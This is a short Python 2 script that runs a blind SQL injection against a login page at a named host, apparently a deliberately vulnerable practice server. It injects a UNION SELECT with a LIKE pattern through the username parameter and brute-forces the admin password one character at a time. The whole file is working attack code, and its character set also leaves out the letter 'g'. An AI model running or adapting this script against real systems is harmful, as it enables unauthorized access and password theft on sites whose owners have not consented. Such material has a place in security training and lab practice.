import urllib2

HOST = "http://vulnserver-failedxyz.c9.io/login.php"

def con(username , password , char , answer):
    TMP = HOST + "?username=" + username + "&password=" + password
    TMP = TMP.replace(" " , "%20")
    request = urllib2.Request(TMP , "")
    received = urllib2.urlopen(request).read()
    # print received
    if "You're in!" in received:
        answer += char
    return answer

alpha = "abcdefhijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"

PREFIX = "\' UNION SELECT * from users where username = \"admin\" AND password LIKE \""
SUFFIX = "%\" -- "

def brute():
    answer = ""
    for i in range(0 , 35):
        for c in alpha:
            bkup = answer
            answer = con(PREFIX + answer + c + SUFFIX , "" , c , answer)
            if bkup != answer:
                print answer
                break

    print answer

brute()
